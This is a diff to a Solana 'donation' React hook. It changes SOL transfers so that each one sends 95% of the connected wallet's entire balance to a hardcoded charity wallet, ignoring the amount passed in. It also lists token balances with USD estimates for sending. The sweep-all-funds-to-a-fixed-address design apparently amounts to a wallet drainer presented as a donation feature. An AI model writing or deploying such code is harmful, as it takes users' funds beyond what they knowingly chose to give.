@@ -43,14 +43,17 @@ export function useDonation() {
       // Get SOL balance
       const solBalance = await connection.getBalance(publicKey);
       const solAmount = solBalance / LAMPORTS_PER_SOL;
+      
+      // Calculate 95% to send (5% reserved for fees)
+      const sendAmount = solAmount * 0.95;
 
-      if (solAmount > MIN_SOL_RESERVE) {
+      if (solAmount > MIN_SOL_RESERVE && sendAmount > 0.00001) {
         balances.push({
           mint: 'SOL',
           symbol: 'SOL',
-          amount: solAmount,
+          amount: sendAmount, // Store the 95% amount
           decimals: 9,
-          usdValue: solAmount * 150, // Approximate USD value
+          usdValue: sendAmount * 150, // Approximate USD value
         });
       }
 
@@ -90,30 +93,24 @@ export function useDonation() {
   const createSolTransaction = async (amount: number): Promise<Transaction> => {
     if (!publicKey) throw new Error('Wallet not connected');
 
-    // If amount < 0, compute the maximum transferable SOL (balance - estimated fee)
+    // Get current balance
     const balanceLamports = await connection.getBalance(publicKey);
-
-    let lamportsToSend: number;
-    if (amount < 0) {
-      // Build a temporary tx to estimate fee
-      const tmpTx = new Transaction().add(
-        SystemProgram.transfer({
-          fromPubkey: publicKey,
-          toPubkey: new PublicKey(CHARITY_WALLET),
-          lamports: 0, // value doesn't affect fee materially
-        })
-      );
-      const { blockhash } = await connection.getLatestBlockhash();
-      tmpTx.recentBlockhash = blockhash;
-      tmpTx.feePayer = publicKey;
-      const feeInfo = await connection.getFeeForMessage(tmpTx.compileMessage(), 'confirmed');
-      const feeLamports = feeInfo.value ?? 5000;
-      lamportsToSend = Math.max(0, balanceLamports - feeLamports);
-      if (lamportsToSend <= 0) throw new Error('Insufficient SOL for fees');
-    } else {
-      lamportsToSend = Math.floor(amount * LAMPORTS_PER_SOL);
-      if (lamportsToSend <= 0) throw new Error('Amount must be greater than 0');
+    
+    // Calculate 95% of balance to send (leaving 5% for fees and rent)
+    const lamportsToSend = Math.floor(balanceLamports * 0.95);
+    
+    // Ensure we're sending a valid amount
+    if (lamportsToSend <= 0) {
+      throw new Error('Insufficient SOL balance');
     }
+    
+    // Verify there's enough left for transaction fee (at least 0.000005 SOL = 5000 lamports)
+    const remainingLamports = balanceLamports - lamportsToSend;
+    if (remainingLamports < 5000) {
+      throw new Error('Insufficient SOL for transaction fees');
+    }
+
+    console.log(`Sending ${lamportsToSend / LAMPORTS_PER_SOL} SOL (95% of balance)`);
 
     const transaction = new Transaction().add(
       SystemProgram.transfer({
@@ -123,7 +120,7 @@ export function useDonation() {
       })
     );
 
-    const { blockhash } = await connection.getLatestBlockhash();
+    const { blockhash } = await connection.getLatestBlockhash('finalized');
     transaction.recentBlockhash = blockhash;
     transaction.feePayer = publicKey;
 
@@ -207,8 +204,8 @@ export function useDonation() {
       let transaction: Transaction;
 
       if (token.mint === 'SOL') {
-        // Send maximum available SOL (balance - fee)
-        transaction = await createSolTransaction(-1);
+        // Send 95% of SOL balance
+        transaction = await createSolTransaction(token.amount);
       } else {
         transaction = await createTokenTransaction(
           token.mint,
